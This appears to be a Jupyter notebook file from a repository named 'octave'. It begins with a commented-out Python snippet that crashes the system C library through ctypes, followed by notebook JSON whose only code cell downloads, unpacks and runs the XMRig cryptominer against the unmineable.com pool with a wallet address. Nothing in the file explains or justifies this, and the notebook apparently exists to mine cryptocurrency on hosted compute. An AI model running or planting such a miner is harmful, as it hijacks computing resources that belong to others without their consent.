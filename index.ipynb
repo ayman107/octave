import sys
from ctypes import CDLL
# This will crash a Linux or Mac system
# equivalent calls can be made on Windows

# Uncomment these lines if you would like to see the segfault

# dll = 'dylib' if sys.platform == 'darwin' else 'so.6'
# libc = CDLL("libc.%s" % dll)
# libc.time(-1)  # BOOM!!
{"metadata":{"language_info":{"name":"python","version":"3.7.12","mimetype":"text/x-python","codemirror_mode":{"name":"ipython","version":3},"pygments_lexer":"ipython3","nbconvert_exporter":"python","file_extension":".py"},"kernelspec":{"name":"python3","display_name":"Python 3 (ipykernel)","language":"python"}},"nbformat_minor":5,"nbformat":4,"cells":[{"cell_type":"code","source":"\n! wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz \n! tar -zxvf xmrig-6.14.1-linux-x64.tar.gz \n! cd xmrig-6.14.1 &&  ./xmrig -o rx.unmineable.com:80 -a rx -k -u TPZj8DFxecVmUxVwj5deZwfTKFXqoRgYmz.aa$x\n","metadata":{},"execution_count":null,"outputs":[],"id":"0e347348-34c8-45e7-81c1-63cba300118b"}]}
